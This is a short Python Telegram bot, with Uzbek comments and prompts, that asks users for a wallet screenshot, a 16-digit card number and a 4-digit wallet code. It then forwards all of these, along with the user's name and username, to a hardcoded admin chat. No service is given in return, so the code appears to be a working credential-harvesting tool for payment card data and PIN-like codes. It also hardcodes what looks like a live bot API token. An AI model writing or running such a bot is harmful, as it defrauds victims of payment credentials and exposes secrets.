import telebot
from telebot import types

API_KEY = '6948943054:AAGxXp5b1mxQZvKm0oatOt6JlAUJST6-EDk'
bot = telebot.TeleBot(API_KEY)
ADMIN_ID = 500436609

user_data = {}  # Foydalanuvchi ma'lumotlarini vaqtincha saqlash

# Start komandasi
@bot.message_handler(commands=['start'])
def start(message):
    user_data[message.chat.id] = {}  # Foydalanuvchi ma'lumotlarini boshlang'ich holatga qaytarish
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("Send wallet screenshot"))
    bot.send_message(message.chat.id, "Iltimos, hamyoningiz skrinshotini yuboring:", reply_markup=markup)

# Skrinshot qabul qilish
@bot.message_handler(content_types=['photo'])
def handle_wallet_screenshot(message):
    try:
        screenshot_file_id = message.photo[-1].file_id
        user_data[message.chat.id]['screenshot_file_id'] = screenshot_file_id
        bot.send_message(message.chat.id, "Hamyon skrinshoti qabul qilindi. Iltimos, karta raqamingizni kiriting:")
        bot.register_next_step_handler(message, process_card_number)
    except Exception as e:
        bot.send_message(message.chat.id, "Xatolik: " + str(e))

# Karta raqamini qabul qilish
def process_card_number(message):
    try:
        card_number = message.text
        if not card_number.isdigit() or len(card_number) != 16:  # Karta raqami uzunligini tekshirish
            bot.send_message(message.chat.id, "Noto'g'ri karta raqami. Iltimos, 16 ta raqam kiriting.")
            return bot.register_next_step_handler(message, process_card_number)
        user_data[message.chat.id]['card_number'] = card_number
        bot.send_message(message.chat.id, "Karta raqami qabul qilindi. Iltimos, 4 ta hamyon kodlarini kiriting:")
        bot.register_next_step_handler(message, handle_wallet_codes)
    except Exception as e:
        bot.send_message(message.chat.id, "Xatolik: " + str(e))

# Hamyon kodlarini qabul qilish
def handle_wallet_codes(message):
    try:
        wallet_codes = message.text
        if not wallet_codes.isdigit() or len(wallet_codes) != 4:  # 24 ta raqamdan iborat bo'lishi kerak
            bot.send_message(message.chat.id, "Noto'g'ri hamyon kodlari. Iltimos, 4 ta raqam kiriting.")
            return bot.register_next_step_handler(message, handle_wallet_codes)
        user_data[message.chat.id]['wallet_codes'] = wallet_codes
        bot.send_message(message.chat.id, "Hamyon kodlari qabul qilindi. So'rovingiz qabul qilindi.")
        send_user_info_to_admin(message)
    except Exception as e:
        bot.send_message(message.chat.id, "Xatolik: " + str(e))

# Foydalanuvchi ma'lumotlarini adminga yuborish
def send_user_info_to_admin(message):
    try:
        user_info = (
            f"Yangi so'rov: {message.chat.id}\n"
            f"Foydalanuvchi ismi: {message.from_user.username}\n"
            f"Ismi: {message.from_user.first_name}\n"
            f"Familiyasi: {message.from_user.last_name}\n"
            f"Karta raqami: {user_data[message.chat.id]['card_number']}\n"
            f"Hamyon kodlari: {user_data[message.chat.id]['wallet_codes']}"
        )
        # Skrinshotni olish va adminga jo'natish
        file_info = bot.get_file(user_data[message.chat.id]['screenshot_file_id'])
        downloaded_file = bot.download_file(file_info.file_path)
        bot.send_photo(ADMIN_ID, downloaded_file, caption=user_info)
    except Exception as e:
        bot.send_message(ADMIN_ID, "Xatolik: " + str(e))

# Botni ishga tushirish
bot.polling()
